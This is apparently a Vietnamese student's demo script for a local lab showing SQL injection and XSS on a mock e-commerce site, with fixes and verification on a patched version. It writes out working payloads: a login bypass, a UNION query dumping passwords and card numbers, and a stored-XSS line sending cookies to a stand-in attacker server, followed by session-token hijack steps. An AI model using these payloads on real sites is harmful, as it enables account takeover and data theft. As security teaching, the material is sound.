# Kịch bản demo đề tài 3: SQL Injection và XSS trên web TMĐT giả lập

Thời lượng dự kiến: khoảng 19 phút, chưa tính phần chuẩn bị. Kịch bản đi theo 4 bước của đề bài, cùng cấu trúc với chương 5 của báo cáo Word:

| Bước | Nội dung | Thời lượng |
|---|---|---|
| 1. Lab setup | Dựng môi trường bằng Docker Compose, đưa CSDL về dữ liệu ban đầu | Làm trước buổi demo |
| 2. Exploitation | Tấn công bản lỗi 8080: SQLi đăng nhập, SQLi UNION, XSS chiếm phiên | 12 phút |
| 3. Defense & Mitigation | Giải thích và chỉ ra các biện pháp phòng thủ ở bản vá 8081 | 2 phút |
| 4. Verification | Chạy lại đúng các payload trên 8081, chứng minh bị chặn | 3 phút |
| Kết luận | Tổng kết, tính khả thi và bài học cho doanh nghiệp | 2 phút |

Nhịp của cả buổi: làm hết 3 màn tấn công ở bản lỗi (8080), giải thích cách khắc phục, rồi chạy lại đúng các payload đó ở bản vá (8081) để đối chứng.

Các bước chính (đăng nhập bypass, UNION, XSS chiếm phiên, đối chứng 8081) đã được chạy thử trên lab ngày 19/11/2026. Chưa kiểm chứng: hộp thoại `alert` của Reflected XSS trên Chrome thật (khi tập, nếu không hiện thì dùng payload dự phòng `<script>alert('XSS')</script>`) và script sqlmap tùy chọn.
Riêng phần trả lời Q&A về đăng nhập, xem thêm `cach_trinh_bay_sql_injection.md`.

---

## 0. Hiểu đề tài trong 1 phút (để tự trả lời được khi bị hỏi)

Cả hai lỗi đều chung một gốc: **ứng dụng lẫn lộn giữa "dữ liệu" và "mã lệnh"**.
Người dùng chỉ được phép gửi dữ liệu, nhưng ứng dụng lại đem dữ liệu đó ghép vào chỗ sẽ được thực thi như mã.

| | SQL Injection | XSS (Cross-Site Scripting) |
|---|---|---|
| Dữ liệu bẩn bị ghép vào | Câu lệnh **SQL** gửi xuống CSDL | Trang **HTML** gửi về trình duyệt |
| Ai thực thi mã bẩn | **Máy chủ CSDL** (MariaDB) | **Trình duyệt của nạn nhân** |
| Ai là nạn nhân | Chính hệ thống: lộ/sửa dữ liệu, vào được tài khoản người khác | Người dùng khác: bị đọc cookie, chiếm phiên, bị lừa |
| OWASP Top 10 (2021) | A03: Injection | A03: Injection (XSS được gộp vào đây) |
| Cách vá gốc | **Tham số hóa truy vấn** (`PreparedStatement`) | **Mã hóa đầu ra** (`th:text` thay vì `th:utext`) |
| Lớp phòng thủ thêm | Ẩn lỗi CSDL, kiểm tra đầu vào | Cookie `HttpOnly`/`SameSite`, CSP header |

Hai loại XSS trong demo:
- **Reflected XSS**: mã độc nằm trong **đường link**. Nạn nhân phải bấm vào link thì mới dính. Máy chủ "phản chiếu" lại nguyên văn.
- **Stored XSS**: mã độc được **lưu vào CSDL** (ví dụ trong bình luận). **Ai mở trang cũng dính**, không cần bấm gì. Nguy hiểm hơn.

---

## Bước 1. Thiết lập môi trường (Lab setup), làm trước buổi demo 10 phút

1. Bật Docker Desktop, rồi khởi động lab kèm server hứng cookie (cổng 8888):
   ```powershell
   docker compose --profile xss-demo up -d --build
   ```
2. Reset dữ liệu về trạng thái sạch (xóa bình luận cũ):
   ```powershell
   .\scripts\reset_db.ps1
   ```
3. Mở sẵn:
   - Tab A: `http://localhost:8080` (bản lỗi, giao diện đỏ)
   - Tab B: `http://localhost:8081` (bản vá, giao diện xanh)
   - Một cửa sổ **ẩn danh** (dùng ở màn chiếm phiên)
   - Terminal đang theo dõi server của kẻ tấn công:
     ```powershell
     docker logs -f --tail 0 websec_cookie_stealer
     ```
   - VS Code mở `lab-environment/app-vulnerable/.../controller/AppController.java` và bản `app-secured` tương ứng.
4. Ở cả hai tab, nếu đang đăng nhập thì bấm **Đăng xuất**.

Tài khoản thật trong lab (để so sánh): `nguyenvana` / `pass123456`.

Kiểm tra lab đã sẵn sàng: `docker compose ps` phải liệt kê đủ 4 container (`websec_mysql_db`, `websec_app_vulnerable`, `websec_app_secured`, `websec_cookie_stealer`) ở trạng thái Up, và mở được cả hai trang chủ.

---

## Bước 2. Thực hiện tấn công (Exploitation), khoảng 12 phút

Cả ba màn dưới đây thực hiện trên bản lỗi 8080. Phần đối chứng ở 8081 để dành cho bước 4, sau khi đã giải thích cách khắc phục ở bước 3.

### Màn 1: SQL Injection vượt qua đăng nhập (khoảng 4 phút)

**Câu dẫn:** "Trang đăng nhập kiểm tra tài khoản bằng một câu SQL. Nhóm em sẽ đăng nhập vào tài khoản admin mà không biết mật khẩu."

#### Tấn công ở 8080
1. Vào `http://localhost:8080/login`.
2. Ô tài khoản nhập: `admin' -- ` (có **dấu cách ở cuối**). Ô mật khẩu nhập bừa: `sai_mat_khau`.
3. **Dừng lại, chỉ vào khung đen "Xem trước câu lệnh SQL"** ngay dưới form:
   ```sql
   SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'sai_mat_khau'
   ```
   Giải thích 3 ý:
   - Dấu `'` sau `admin` **đóng chuỗi sớm**.
   - `-- ` là **chú thích** trong MySQL/MariaDB, nên mọi thứ phía sau bị bỏ qua.
   - Điều kiện kiểm tra mật khẩu **biến mất**, câu SQL chỉ còn "lấy user tên admin".
4. Bấm **Đăng nhập**. Kết quả: về trang chủ, banner đỏ "CA KIỂM THỬ SQL INJECTION THÀNH CÔNG", góc trên hiện **"Xin chào, Quản Trị Viên Hệ Thống (admin)"**.

#### Xem code lỗi
`app-vulnerable/.../AppController.java`, hàm xử lý `POST /login`:
```java
String sql = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
```
"Dữ liệu người dùng được **cộng chuỗi** thẳng vào câu lệnh, nên CSDL không phân biệt được đâu là lệnh, đâu là dữ liệu."

### Màn 2: SQL Injection lấy trộm cả bảng tài khoản (khoảng 2 phút)

**Câu dẫn:** "Vào được admin mới là một chuyện. Nguy hiểm hơn là đọc được toàn bộ dữ liệu, kể cả mật khẩu và thẻ tín dụng, chỉ qua ô tìm kiếm."

Ở `http://localhost:8080/search`, chỉ làm **2 bước**. Mỗi lần, chỉ vào khung "Câu lệnh SQL thực thi trong Java Backend":

| Bước | Gõ vào ô tìm kiếm | Màn hình | Nói |
|---|---|---|---|
| 1 | `'` | Hộp đỏ **Lỗi MySQL** | "Chỉ một dấu nháy đã làm câu lệnh lỗi, chứng tỏ chữ em gõ lọt thẳng vào câu SQL." |
| 2 | `zzz' UNION SELECT 1, username, password, credit_card FROM users -- ` | Danh sách "sản phẩm" là **4 tài khoản**, kèm mật khẩu và số thẻ | "`UNION` **nối thêm kết quả của một câu SELECT khác** vào kết quả tìm kiếm. Em ghép thêm câu lấy tài khoản, mật khẩu, số thẻ từ bảng users, nên toàn bộ dữ liệu khách hàng hiện ra ngay trên trang." |

Mẹo: chép sẵn payload bước 2 ra Notepad rồi dán vào ô tìm kiếm. Chữ `zzz` ở đầu để không có sản phẩm thật nào khớp, kết quả chỉ còn dữ liệu bị trộm.

#### Chỉ dùng khi thầy hỏi thêm (không cần demo)
- **"Sao biết bảng tên users, cột tên password?"** "MySQL có sẵn CSDL hệ thống `information_schema`, giống như mục lục của mọi bảng và cột. Kẻ tấn công đọc mục lục đó qua chính lỗ SQLi trước." Nếu thầy muốn xem tận mắt, gõ:
  `zzz' UNION SELECT 1, table_name, 3, 4 FROM information_schema.tables WHERE table_schema=database() -- ` (hiện `users`, `products`, `comments`).
- **"Sao lại là 4 cột (1, username, password, credit_card)?"** "UNION bắt buộc số cột bằng câu gốc. Câu gốc lấy 4 cột (id, name, description, price), kẻ tấn công dò bằng `' ORDER BY 4 -- ` (chạy được) và `' ORDER BY 5 -- ` (lỗi)."
- **"Làm tay mệt vậy, thực tế thì sao?"** "Công cụ sqlmap tự động làm toàn bộ các bước dò này."
- **"Sao SQLi lại xảy ra ở ô tìm kiếm?"** "Gõ `iPhone` thì máy chủ phải tra CSDL bằng `SELECT * FROM products WHERE name LIKE '%iPhone%'`, và code ghép thẳng từ khóa vào câu lệnh. Ô tìm kiếm cũng giống ô đăng nhập: đăng nhập dùng để kiểm tra tài khoản, tìm kiếm dùng để lọc sản phẩm, nhưng lỗi giống hệt nhau. Ô nhập nào bị ghép vào SQL cũng có thể bị SQLi."
- **"Sao biết ô tìm kiếm có truy vấn CSDL?"** "Danh sách sản phẩm thay đổi theo từ khóa, nên máy chủ chắc chắn phải tra CSDL. Để xác nhận, em gõ `'`. Ô an toàn sẽ chỉ báo 'không tìm thấy', còn ở đây báo **lỗi MySQL**, nghĩa là dấu nháy đã lọt vào câu SQL (lỗi cũng lộ luôn loại CSDL)." Nếu thầy hỏi "lỡ trang giấu lỗi thì sao": gõ `iPhone%' -- ` thì ra giống `iPhone` (vẫn có iPhone 15 Pro Max), còn gõ `iPhone' AND '1'='2` thì ra rỗng. Kết quả đổi theo logic SQL, chứng tỏ CSDL đang thực thi chữ mình gõ.
- **"Bỏ chữ `zzz` thì sao?"** "Vẫn lộ dữ liệu, chỉ là bị trộn với toàn bộ sản phẩm thật, vì `LIKE '%'` khớp mọi tên. Có `zzz` thì phần tìm kiếm gốc ra rỗng, chỉ còn dữ liệu bị trộm cho dễ nhìn. Đó là mẹo trình bày, không phải điều kiện để tấn công." (Đã thử: bỏ `zzz` vẫn hiện tài khoản admin, kèm iPhone 15 Pro Max và các sản phẩm khác.)
- **Lưu ý:** khung "Câu lệnh SQL thực thi" trên trang 8080 là phần thêm cho lab dễ nhìn. Web thật không có khung này, hacker phải dựa vào thông báo lỗi và các phép thử ở trên.

Code lỗi: `"... WHERE name LIKE '%" + keyword + "%'"`.

### Màn 3: XSS, chiếm tài khoản admin mà không cần mật khẩu (khoảng 6 phút, màn ấn tượng nhất)

**Hai vai, hai cửa sổ (nói rõ với thầy ngay đầu màn):**

| Vai | Cửa sổ | Biết mật khẩu admin? | Làm gì |
|---|---|---|---|
| **Hacker** | Chrome **ẩn danh** + terminal `docker logs -f --tail 0 websec_cookie_stealer` | **Không** | Dò lỗi, gửi bình luận độc, chờ nhận token, dùng token |
| **Admin (nạn nhân)** | Chrome **thường** | Có | Đăng nhập như mọi ngày, mở trang sản phẩm |

**Chuẩn bị:** ở cửa sổ thường, Đăng xuất 8080 (hoặc F12 → Application → Cookies → chuột phải `http://localhost:8080` → Clear) để không còn cookie cũ của tài khoản khác. Cửa sổ ẩn danh mở mới. `.\scripts\reset_db.ps1` để xóa bình luận độc cũ.

**Câu dẫn:** "Hai màn trước tấn công **CSDL**. Giờ em chuyển sang **XSS**: kẻ tấn công làm cho **trình duyệt của nạn nhân** chạy JavaScript do chúng viết. Em chia 2 vai: cửa sổ ẩn danh là **hacker, không biết mật khẩu gì cả**; cửa sổ thường là **admin**."

#### Thao tác 1 [HACKER, cửa sổ ẩn danh]: Dò xem trang có chạy mã lạ không
1. Vào `localhost:8080/search`, gõ `<b>test</b>` → chữ **test** hiện in đậm.
   "Trang không mã hóa thứ em gõ, trình duyệt hiểu nó là HTML. Có khả năng bị XSS."
2. Gõ tiếp `<script>alert(document.cookie)</script>` → **hộp thoại bật lên** (rỗng hoặc chỉ có cookie rác, vì hacker chưa đăng nhập).
   "Mã JavaScript đã chạy. Đây là payload chuẩn trong tài liệu OWASP để xác nhận lỗi. Mã nằm trong đường link nên gọi là **Reflected XSS**."
3. "Nhưng mã chỉ chạy trên máy em, đọc cookie của chính em thì vô dụng. Hacker không ngồi vào máy admin để bấm F12 được. Phải làm sao cho **trình duyệt của admin tự chạy mã**."

#### Thao tác 2 [HACKER, cửa sổ ẩn danh]: Gửi bình luận chứa mã độc, không cần đăng nhập
1. Vào `localhost:8080/product?id=1`, gửi bình luận:
   ```html
   <script>new Image().src='http://localhost:8888/steal?cookie='+encodeURIComponent(document.cookie)</script>Sản phẩm rất tốt, 5 sao!
   ```
2. Bình luận hiện tên "Khách hàng" và chỉ có dòng "Sản phẩm rất tốt, 5 sao!", **phần mã độc không thấy**.
   "Em không có tài khoản nào. Mã đã lưu vào CSDL, ai mở trang này cũng chạy nó, nên gọi là **Stored XSS**. Giờ hacker chỉ việc **chờ**."

#### Thao tác 3 [ADMIN, cửa sổ thường]: Admin làm việc bình thường
1. "Bây giờ em đóng vai admin. Admin đăng nhập bằng **mật khẩu thật của mình**, như mọi ngày." Đăng nhập `admin` / `admin123_super_secret`.
2. Admin vào xem `localhost:8080/product?id=1`. Không bấm gì thêm.

#### Thao tác 4 [HACKER, terminal]: Nhận token của admin
1. Chỉ sang terminal, dòng mới nhất có `session_token=...`.
   "Admin chỉ mở trang, trình duyệt admin đã tự gửi token về máy hacker. Hacker không hề biết mật khẩu."
2. Copy đúng phần sau `session_token=` ở **dòng mới nhất** (bỏ qua `_ga`, `csrftoken`, `locale`: cookie của web khác trên localhost).

#### Thao tác 5 [HACKER, cửa sổ ẩn danh]: Dùng token vào tài khoản admin
1. Ở cửa sổ ẩn danh (đang là "Khách vãng lai"): F12 → **Application** → **Cookies** → `http://localhost:8080` → nhấp đúp dòng trống: Name `session_token`, Value **dán chuỗi vừa copy** → F5.
   Cách khác qua Console: gõ tay `allow pasting` + Enter, rồi dán `document.cookie = "session_token=CHUỖI_VỪA_COPY; path=/"; location.reload();`
2. Trang hiện **"Xin chào, Quản Trị Viên Hệ Thống (admin)"**.
   "Hacker đã vào tài khoản admin: **không biết mật khẩu, không cần SQL Injection**, chỉ cần admin mở trang."

**Câu chốt:** "Gốc rễ chỉ có một: trang in dữ liệu người dùng ra mà **không mã hóa**. Thêm nữa cookie phiên không bật HttpOnly nên JavaScript đọc được."

Code lỗi (chỉ nói nếu thầy hỏi):
- `search.html` và `product.html` dùng `th:utext` (u = unescaped, không mã hóa).
- `AppController.java`: `cookie.setHttpOnly(false);`.

**Thầy có thể hỏi:**
- *"Sao không bấm F12 gõ `document.cookie` cho nhanh?"* F12 chỉ đọc cookie trên máy mình. Hacker không vào được máy admin, nên phải cài mã vào trang để trình duyệt admin tự đọc và tự gửi.
- *"Admin phải đăng nhập thì khác gì hacker phải vào được admin?"* Người đăng nhập là **chính admin**, bằng mật khẩu của admin, việc hằng ngày. Hacker không cần mật khẩu, chỉ chờ admin mở trang.
- *"Hacker sao biết dùng `<script>`?"* Tìm chỗ trang in lại dữ liệu nhập, thử `<b>` vô hại, thấy thành HTML thì thử `<script>` (payload chuẩn của OWASP), hoặc dùng công cụ quét như Burp Suite.
- *"Màn 1 vào admin rồi, cần gì XSS?"* Hai lỗ độc lập. Vá SQLi mà còn XSS thì vẫn mất tài khoản, dù mật khẩu mạnh đến đâu.
- *"Sao em biết viết đoạn `new Image()...` này?"* Đây là payload trộm cookie kinh điển, tham khảo từ OWASP và PortSwigger Web Security Academy. Nó nối tiếp bước 1: đã biết trang chạy `<script>` và `document.cookie` đọc được token, chỉ cần thay `alert` (hiện cho mình xem) bằng lệnh **gửi cookie sang máy mình**. Từng phần:
  - `document.cookie`: đọc cookie của người đang xem trang.
  - `new Image().src='http://localhost:8888/steal?cookie=...'`: tạo ảnh ẩn trỏ tới server hacker, trình duyệt tự gửi request "tải ảnh" kèm cookie trên URL, không hiện gì.
  - `encodeURIComponent(...)`: mã hóa cookie cho an toàn trên URL (cookie có `;`, `=`, khoảng trắng).
  - `Sản phẩm rất tốt, 5 sao!`: chữ ngụy trang, trang chỉ hiện câu khen.
- *"localhost:8888 là gì?"* Server của hacker, dựng bằng Docker để giả lập. Ngoài đời là một tên miền của hacker trên Internet.
- *"Dòng 'Không tìm thấy cookie' đầu tiên ở terminal là gì?"* Chính hacker vừa xem trang sau khi gửi bình luận, chưa đăng nhập nên không có gì để mất. Ai mở trang thì mã chạy trên trình duyệt người đó.

---

## Bước 3. Triển khai giải pháp phòng thủ (Defense & Mitigation), khoảng 2 phút

**Câu dẫn:** "Vừa rồi em khai thác được ba lỗ hổng trên bản 8080. Bản 8081 là bản đã vá: cùng giao diện, cùng cơ sở dữ liệu, chỉ khác cách viết mã. Em xin nói nhanh bốn biện pháp phòng thủ, gọi tên kỹ thuật và chỉ ra chỗ sửa."

Cách trình bày: mở sẵn `AppController.java` của hai bản (đã chuẩn bị ở bước 1), mỗi kỹ thuật nói một đến hai câu. Nếu thầy chưa hỏi sâu thì chỉ cần nói tên kỹ thuật và vị trí trong bảng dưới.

### Bốn biện pháp và vị trí trong mã

| Lỗ hổng | Gốc rễ ở 8080 | Tên kỹ thuật khắc phục | Vai trò |
|---|---|---|---|
| SQLi | Cộng chuỗi vào câu SQL | **Parameterized Query / Prepared Statement** (truy vấn tham số hóa) | Chặn tận gốc |
| XSS | In dữ liệu ra trang không mã hóa (`th:utext`) | **Output Encoding** (mã hóa đầu ra, `th:text`) | Chặn tận gốc |
| XSS | JavaScript đọc được cookie phiên | **Cookie HttpOnly + SameSite** | Lớp phụ: lỡ còn XSS thì cookie vẫn không bị trộm |
| XSS | Trình duyệt chạy mọi script | **CSP: Content Security Policy** | Lớp phụ: chặn script lạ và chặn gửi dữ liệu ra ngoài |

Cả bộ gọi chung là **Defense in Depth (phòng thủ nhiều lớp)**: một lớp sơ hở thì lớp khác vẫn chặn. Hai kỹ thuật chính là khuyến nghị số 1 trong OWASP SQL Injection Prevention Cheat Sheet và OWASP XSS Prevention Cheat Sheet.

**1. Parameterized Query (SQLi).** 8080: `"... WHERE username = '" + username + "' ..."`. 8081 (`app-secured/.../AppController.java:388-391`, tìm kiếm ở `:142-146`):
```java
String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
pstmt.setString(1, username);
pstmt.setString(2, password);
// tìm kiếm: "... WHERE name LIKE ?" + pstmt.setString(1, "%" + keyword + "%");
```
"Gửi **khuôn lệnh** có chỗ trống `?` trước, CSDL chốt cứng cấu trúc; **dữ liệu** gửi sau chỉ là giá trị, không bao giờ được dịch thành lệnh. Gõ `admin' -- ` thì CSDL đi tìm user tên đúng nguyên văn `admin' -- `. Giống điền vào mẫu đơn in sẵn: viết gì vào ô Họ tên thì vẫn chỉ là họ tên." Mọi câu SQL ở 8081 (đăng nhập, tìm kiếm, xem sản phẩm, bình luận) đều dùng `?`.

**2. Output Encoding (XSS).** 8080: `th:utext` (u = unescaped). 8081 (`search.html:187`, `product.html:351`): `th:text`.

| Gõ vào | In ra HTML | Trình duyệt hiển thị |
|---|---|---|
| `<script>` | `&lt;script&gt;` | chữ `<script>` |
| `<b>test</b>` | `&lt;b&gt;test&lt;/b&gt;` | chữ `<b>test</b>`, không in đậm |

"Dữ liệu người dùng luôn được in ra dưới dạng **chữ**, không bao giờ thành **mã**."

**3. Cookie HttpOnly + SameSite.** 8080: `cookie.setHttpOnly(false)`. 8081 (`application.properties:28-29`): `server.servlet.session.cookie.http-only=true`, `same-site=strict`. "HttpOnly: cookie vẫn gửi lên máy chủ, nhưng `document.cookie` không thấy. SameSite=Strict: trang web khác không làm trình duyệt gửi kèm cookie này được."

**4. CSP.** 8081 (`SecurityHeadersFilter.java:24`) gắn vào mọi trang: `Content-Security-Policy: default-src 'self'; style-src 'self' 'unsafe-inline';`. "Máy chủ ra lệnh cho trình duyệt: chỉ chạy script từ file của chính tôi. Script nhúng trong bình luận bị chặn, gửi dữ liệu sang `localhost:8888` cũng bị chặn." Filter còn gắn `X-Frame-Options: DENY` và `X-Content-Type-Options: nosniff`.

**Câu chốt:** "Nguyên tắc chung là **không tin dữ liệu người dùng**: vào CSDL thì tách khỏi lệnh (Parameterized Query), ra trình duyệt thì mã hóa thành chữ (Output Encoding), và thêm nhiều lớp phòng thủ (HttpOnly, CSP)."

---

## Bước 4. Kiểm tra lại hiệu quả sau khi phòng thủ (Verification), khoảng 3 phút

**Câu dẫn:** "Bây giờ em chạy lại **đúng các payload vừa rồi** trên bản đã vá ở cổng 8081. Giao diện giống hệt, CSDL dùng chung, chỉ khác cách viết code."

### Đối chứng màn 1: đăng nhập
1. Vào `http://localhost:8081/login`, tài khoản `admin' -- `, mật khẩu `sai_mat_khau`.
2. Kết quả: **"Tên đăng nhập hoặc mật khẩu không chính xác!"**
   "Bản vá dùng **PreparedStatement**: câu lệnh gửi xuống CSDL **trước**, có chỗ trống `?`; dữ liệu gửi **sau**. Nên `admin' -- ` chỉ là một **cái tên lạ**, dấu nháy hay `--` không đổi được cấu trúc lệnh."

Code vá (chỉ nói nếu thầy hỏi):
```java
String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
pstmt.setString(1, username);
pstmt.setString(2, password);
```

### Đối chứng màn 2: ô tìm kiếm
1. Ở `http://localhost:8081/search`, gõ `'`: **không có lỗi MySQL**, chỉ hiện "Không tìm thấy sản phẩm nào".
   "Dấu nháy giờ chỉ là một ký tự để tìm, không làm vỡ câu lệnh."
2. Dán payload UNION: **"Không tìm thấy sản phẩm nào"**, không lộ tài khoản.
   "Cả chuỗi `UNION SELECT...` bị coi là **một từ khóa tìm kiếm**, CSDL đi tìm sản phẩm có tên như vậy và tất nhiên không có."

### Đối chứng màn 3: XSS
1. Gõ `<b>test</b>` vào ô tìm kiếm 8081: hiện **nguyên văn chữ `<b>test</b>`**, không in đậm.
   "Bản vá dùng `th:text`, đổi `<` thành `&lt;`. Trình duyệt chỉ **hiển thị** ký tự đó, không coi là mã."
2. Gửi đúng bình luận độc vào `http://localhost:8081/product?id=2`: bình luận hiện nguyên văn chữ `<script>...`, **terminal không nhận được gì**.
3. Hai lớp phòng thủ thêm, chỉ trên F12 (khi thầy hỏi hoặc còn thời gian):
   - **Application → Cookies → `http://localhost:8081`**: cookie `SECUREDSESSION` có tích **HttpOnly**. "Dù còn sót lỗ XSS ở đâu đó, JavaScript cũng không đọc được cookie này."
   - **Network → bấm request trang → Response Headers**: dòng `Content-Security-Policy: default-src 'self'`. "Trình duyệt chặn script nhúng thẳng trong trang và chặn gửi dữ liệu sang server lạ."

**Câu chốt:** "SQLi chặn bằng **tách lệnh khỏi dữ liệu** (PreparedStatement). XSS chặn bằng **mã hóa đầu ra**, thêm HttpOnly và CSP làm nhiều lớp bảo vệ. Cùng một payload, bản lỗi bị chiếm quyền, bản vá thì không."

Đã kiểm chứng ngày 19/11/2026: login trả "không chính xác!", `'` và UNION trả "Không tìm thấy", `<b>test</b>` thành `&lt;b&gt;test&lt;/b&gt;`, header có CSP, cookie `SECUREDSESSION` có `HttpOnly; SameSite=Strict`.

### Kiểm tra tự động (nói một câu)
"Ngoài thao tác tay, mỗi bản có bộ kiểm thử JUnit riêng. Lần chạy `mvn test` ngày 19/11/2026: bản lỗi đạt 36/36 ca, khẳng định lỗ hổng vẫn khai thác được; bản vá đạt 39/39 ca, khẳng định cùng payload bị chặn."

---

## Kết luận, khoảng 2 phút

**Câu dẫn:** "Em xin tóm tắt lại những gì vừa demo."

| Màn | Lỗ hổng | 8080 (lỗi) | 8081 (vá) | Cách khắc phục |
|---|---|---|---|---|
| 1 | SQLi vượt qua đăng nhập | Vào được admin không cần mật khẩu | Báo sai thông tin | Parameterized Query |
| 2 | SQLi UNION ở ô tìm kiếm | Lộ mật khẩu, số thẻ của mọi khách | Không có kết quả | Parameterized Query |
| 3 | Reflected + Stored XSS | Trộm cookie, chiếm tài khoản admin | Mã hiện thành chữ, không gửi được cookie | Output Encoding + HttpOnly + CSP |

**Nói theo 3 ý:**
1. **Gốc rễ chung:** "Cả hai lỗi đều do **trộn dữ liệu người dùng với mã lệnh**. SQLi là dữ liệu bị hiểu thành lệnh SQL ở CSDL; XSS là dữ liệu bị hiểu thành mã JavaScript ở trình duyệt."
2. **Hậu quả:** "Chỉ với vài ký tự, kẻ tấn công vào được tài khoản quản trị, lấy toàn bộ dữ liệu khách hàng, và chiếm phiên đăng nhập mà không cần mật khẩu. Với web TMĐT thật, đó là lộ thông tin thẻ, mất tiền và mất uy tín."
3. **Cách vá đúng:** "**Tách dữ liệu khỏi lệnh**: Parameterized Query với SQL, Output Encoding với HTML. Thêm HttpOnly và CSP để phòng thủ nhiều lớp. Lọc ký tự hay chặn từ khóa (blacklist) chỉ là lớp phụ, vì luôn có cách lách."

### Tính khả thi và bài học cho doanh nghiệp

**Tính khả thi.** "Giải pháp này khả thi để doanh nghiệp áp dụng. Hai biện pháp chính có sẵn trong JDBC và Thymeleaf nên không cần mua thêm gì. Khối lượng sửa mã nhỏ: đổi nối chuỗi thành tham số `?`, đổi `th:utext` thành `th:text`, thêm vài dòng cấu hình cookie và một bộ lọc header. Chức năng giữ nguyên và kiểm chứng lại được bằng kiểm thử tự động."

**Bài học cho doanh nghiệp:**
- Không tin dữ liệu người dùng, cả khi đi vào CSDL lẫn khi đi ra trình duyệt.
- Đưa quy ước "cấm nối chuỗi vào SQL, mã hóa đầu ra mặc định" vào hướng dẫn lập trình và kiểm tra khi đánh giá mã nguồn.
- Phòng thủ nhiều lớp (HttpOnly, SameSite, CSP) để một lỗi sót không thành sự cố lớn.
- Đưa payload SQLi và XSS vào kiểm thử tự động của quy trình phát triển (DevSecOps).

Lưu ý khi nói: đánh giá này dựa trên lab nhỏ chạy cục bộ; với hệ thống thật cần đo thêm hiệu năng và rà soát toàn bộ câu truy vấn hiện có.

**Câu kết:** "Nguyên tắc em rút ra là **không bao giờ tin dữ liệu người dùng nhập vào**. Đây cũng là lý do Injection, gồm cả SQLi và XSS, luôn nằm trong OWASP Top 10. Phần demo của em đến đây là hết, em cảm ơn thầy và mời thầy đặt câu hỏi."

(Tùy chọn) Chạy công cụ tự động `exploits/sqli/run_sqlmap_demo.sh` để cho thấy kẻ tấn công thật không cần gõ tay. Cần cài sqlmap trước, và kịch bản này chưa được chạy thử.

---

## Sau buổi demo
```powershell
.\scripts\reset_db.ps1
```
Lệnh này xóa bình luận độc hại để lần demo sau bắt đầu từ trạng thái sạch.

## Câu hỏi hay gặp (bổ sung cho file Q&A về SQLi)

- **"Bản vá vẫn lưu mật khẩu dạng chữ thường?"** Đúng. Lab cố ý giữ như vậy để màn UNION cho thấy hậu quả rõ. Thực tế phải băm mật khẩu (bcrypt/Argon2). Nên ghi vào phần "Hạn chế và hướng phát triển" của báo cáo.
- **"Có `HttpOnly` rồi thì còn cần `th:text` không?"** Có. `HttpOnly` chỉ giữ được cookie, còn XSS vẫn có thể sửa giao diện, giả form đăng nhập, hoặc gửi request thay người dùng. Mã hóa đầu ra mới chặn được tận gốc.
- **"Sao không lọc bỏ chữ `<script>`?"** Vì có rất nhiều cách viết khác, ví dụ `<img src=x onerror=...>`, `<svg onload=...>`. Blacklist sẽ luôn sót.
- **"Reflected XSS cần nạn nhân bấm link, vậy thực tế lừa bằng cách nào?"** Gửi qua email hoặc tin nhắn, dùng dịch vụ rút gọn link để giấu payload.
- **"CSDL trong lab lấy ở đâu ra?"** Nhóm tự dựng. File `lab-environment/db/init.sql` tạo CSDL `ecommerce_db` gồm 3 bảng `users`, `products`, `comments` và nạp dữ liệu giả (4 tài khoản, 5 sản phẩm). Docker Compose chạy MariaDB 10.5 và tự nạp file này khi khởi động. Hai web 8080 và 8081 dùng chung một CSDL, nên chỉ khác nhau ở code. Mọi mật khẩu và số thẻ trong đó đều là dữ liệu giả.
- **"Sao biết tên bảng, tên cột để viết UNION?"** Kẻ tấn công không cần biết trước. Họ đọc `information_schema`, CSDL hệ thống có sẵn của MySQL/MariaDB, qua chính lỗ SQLi (mục "Chỉ dùng khi thầy hỏi thêm" của Màn 2).
